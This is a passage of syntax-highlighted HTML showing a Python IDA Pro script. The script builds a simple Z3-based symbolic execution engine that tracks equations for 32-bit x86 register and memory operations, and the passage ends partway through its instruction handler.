<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">class</span> <span class="nc">EquationId</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">id_</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">id_</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__repr__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="k">return</span> <span class="s">&#39;EID:</span><span class="si">%d</span><span class="s">&#39;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">id</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Disassembler</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;A simple class to decode easily instruction in IDA&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">start</span> <span class="o">=</span> <span class="n">start</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">end</span> <span class="o">=</span> <span class="n">end</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">eip</span> <span class="o">=</span> <span class="n">start</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_decode_instr</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;Returns mnemonic, dst, src&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="n">mnem</span> <span class="o">=</span> <span class="n">GetMnem</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">)</span>
</span><span class='line'>        <span class="n">x</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>            <span class="n">ty</span> <span class="o">=</span> <span class="n">GetOpType</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
</span><span class='line'>            <span class="c"># cst</span>
</span><span class='line'>            <span class="k">if</span> <span class="mi">5</span> <span class="o">&lt;=</span> <span class="n">ty</span> <span class="o">&lt;=</span> <span class="mi">7</span><span class="p">:</span>
</span><span class='line'>                <span class="n">x</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">GetOperandValue</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">,</span> <span class="n">i</span><span class="p">))</span>
</span><span class='line'>            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                <span class="n">x</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">GetOpnd</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">,</span> <span class="n">i</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="p">[</span><span class="n">mnem</span><span class="p">]</span> <span class="o">+</span> <span class="n">x</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">get_next_instruction</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;This is a convenient generator, you can iterator through</span>
</span><span class='line'><span class="sd">        each instructions easily&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">eip</span> <span class="o">!=</span> <span class="bp">self</span><span class="o">.</span><span class="n">end</span><span class="p">:</span>
</span><span class='line'>            <span class="k">yield</span> <span class="bp">self</span><span class="o">.</span><span class="n">_decode_instr</span><span class="p">()</span>
</span><span class='line'>            <span class="bp">self</span><span class="o">.</span><span class="n">eip</span> <span class="o">+=</span> <span class="n">ItemSize</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">SymbolicExecutionEngine</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;The symbolic execution engine is the class that will</span>
</span><span class='line'><span class="sd">    handle the symbolic execution. It will keep a track of the </span>
</span><span class='line'><span class="sd">    different equations encountered, and the CPU context at each point of the program.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    The symbolic variables have to be found by the user (or using data-taing). This is not</span>
</span><span class='line'><span class="sd">    the purpose of this class.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    We are lucky, we only need to handle those operations &amp; encodings:</span>
</span><span class='line'><span class="sd">        . mov:</span>
</span><span class='line'><span class="sd">            . mov reg32, reg32</span>
</span><span class='line'><span class="sd">            . mov reg32, [mem]</span>
</span><span class='line'><span class="sd">            . mov [mem], reg32</span>
</span><span class='line'><span class="sd">            . mov reg32, cst</span>
</span><span class='line'><span class="sd">        . shr:</span>
</span><span class='line'><span class="sd">            . shr reg32, cst</span>
</span><span class='line'><span class="sd">        . shl:</span>
</span><span class='line'><span class="sd">            . shl reg32, cst</span>
</span><span class='line'><span class="sd">        . and:</span>
</span><span class='line'><span class="sd">            . and reg32, cst</span>
</span><span class='line'><span class="sd">            . and reg32, reg32</span>
</span><span class='line'><span class="sd">        . xor:</span>
</span><span class='line'><span class="sd">            . xor reg32, cst</span>
</span><span class='line'><span class="sd">        . or:</span>
</span><span class='line'><span class="sd">            . or reg32, reg32</span>
</span><span class='line'><span class="sd">        . add:</span>
</span><span class='line'><span class="sd">            . add reg32, reg32</span>
</span><span class='line'><span class="sd">            . add reg32, cst</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    We also don&#39;t care about:</span>
</span><span class='line'><span class="sd">        . EFLAGS</span>
</span><span class='line'><span class="sd">        . branches</span>
</span><span class='line'><span class="sd">        . smaller registers (16/8 bits)</span>
</span><span class='line'><span class="sd">    Long story short: it&#39;s perfect ; that environment makes really easy to play with symbolic execution.&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">):</span>
</span><span class='line'>        <span class="c"># This is the CPU context at each time</span>
</span><span class='line'>        <span class="c"># The value of the registers are index in the equations dictionnary</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>            <span class="s">&#39;eax&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;ebx&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;ecx&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;edx&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;esi&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;edi&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;ebp&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;esp&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;eip&#39;</span> <span class="p">:</span> <span class="bp">None</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># The address where the symbolic execution will start</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">start</span> <span class="o">=</span> <span class="n">start</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># The address where the symbolic execution will stop</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">end</span> <span class="o">=</span> <span class="n">end</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Our disassembler</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">disass</span> <span class="o">=</span> <span class="n">Disassembler</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># This is the memory that can be used by the instructions to save temporary values/results</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">mem</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Each equation must have a unique id</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># The symbolic variables will be stored there</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Each equation will be stored here</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">equations</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Number of instructions emulated</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">ninstrs</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_check_if_reg32</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">r</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;XXX: make a decorator?&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_push_equation</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">e</span><span class="p">):</span>
</span><span class='line'>        <span class="n">idx</span> <span class="o">=</span> <span class="n">EquationId</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">idx</span><span class="p">)</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">equations</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">idx</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">idx</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">set_reg_with_equation</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">e</span><span class="p">):</span>
</span><span class='line'>        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_check_if_reg32</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
</span><span class='line'>            <span class="k">return</span>
</span><span class='line'>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">r</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_push_equation</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">get_reg_equation</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">r</span><span class="p">):</span>
</span><span class='line'>        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_check_if_reg32</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
</span><span class='line'>            <span class="k">return</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">r</span><span class="p">],</span> <span class="n">EquationId</span><span class="p">):</span>
</span><span class='line'>            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">equations</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">r</span><span class="p">]]</span>
</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">r</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;Run from start address to end address the engine&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">mnemonic</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">disass</span><span class="o">.</span><span class="n">get_next_instruction</span><span class="p">():</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">ninstrs</span> <span class="o">%</span> <span class="mi">5000</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">ninstrs</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>                <span class="k">print</span> <span class="s">&#39;</span><span class="si">%d</span><span class="s"> instructions, </span><span class="si">%d</span><span class="s"> equations so far...&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">ninstrs</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">equations</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">if</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;mov&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># mov reg32, imm32</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">long</span><span class="p">)):</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="n">src</span>
</span><span class='line'>                <span class="c"># mov reg32, reg32</span>
</span><span class='line'>                <span class="k">elif</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">src</span><span class="p">]</span>
</span><span class='line'>                <span class="c"># mov reg32, [mem]</span>
</span><span class='line'>                <span class="k">elif</span> <span class="p">(</span><span class="n">src</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&#39;var_&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">src</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&#39;arg&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">if</span> <span class="n">src</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">:</span>
</span><span class='line'>                        <span class="c"># A non-initialized location is trying to be read, we got a symbolic variable!</span>
</span><span class='line'>                        <span class="n">sym</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">&#39;arg</span><span class="si">%d</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="p">),</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'>                        <span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>
</span><span class='line'>                        <span class="k">print</span> <span class="s">&#39;Trying to read a non-initialized area, we got a new symbolic variable: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">sym</span>
</span><span class='line'>                        <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">src</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_push_equation</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">src</span><span class="p">]</span>
</span><span class='line'>                <span class="c"># mov [mem], reg32</span>
</span><span class='line'>                <span class="k">elif</span> <span class="n">dst</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&#39;var_&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">src</span><span class="p">]</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;mov&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;shr&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># shr reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">long</span><span class="p">)):</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;shr&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;shl&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># shl reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">long</span><span class="p">)):</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;shl&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;and&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># and reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">long</span><span class="p">)):</span>
</span><span class='line'>                    <span class="n">x</span> <span class="o">=</span> <span class="n">src</span>
</span><span class='line'>                <span class="c"># and reg32, reg32</span>
</span><span class='line'>                <span class="k">elif</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="n">x</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;and&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;xor&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># xor reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">long</span><span class="p">)):</span>
</span><span class='line'>                    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">equations</span><span class="p">:</span>
</span><span class='line'>                        <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">^=</span> <span class="n">src</span>
</span><span class='line'>                    <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                        <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">^</span> <span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;xor&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;or&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># or reg32, reg32</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">|</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">src</span><span class="p">))</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;or&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;add&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># add reg32, reg32</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
